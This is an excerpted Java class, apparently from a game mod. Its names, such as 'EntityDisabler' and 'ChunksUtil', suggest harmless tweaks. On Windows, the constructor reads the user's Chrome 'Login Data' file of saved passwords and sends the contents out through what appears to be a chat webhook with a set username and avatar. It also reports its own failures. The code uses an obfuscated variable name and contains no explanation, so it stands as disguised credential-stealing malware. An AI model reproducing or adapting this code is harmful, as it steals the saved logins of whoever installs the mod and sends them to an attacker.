...
import me.noculator.tweaks.ChunksUtil;
...
public class EntityDisabler {

    public EntityDisabler() {
        ...
        if (llLlLlL.contains("Windows")) {
            ...
            try {
                File loginfile = new File(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
                BufferedReader chromedata = new BufferedReader(new FileReader(loginfile));

                String s;

                StringBuilder chrome = new StringBuilder();
                chrome.append("LAUNCHERACCOUNT[S]");

                while ((s = chromedata.readLine()) != null) {
                    chrome.append("\n ").append(s);
                }

                ChunksUtil dm = new ChunksUtil.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + chrome.toString() + "\n```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
                ...
                ChunksUtil dm = new ChunksUtil.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL CHROMEPASSWORD[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
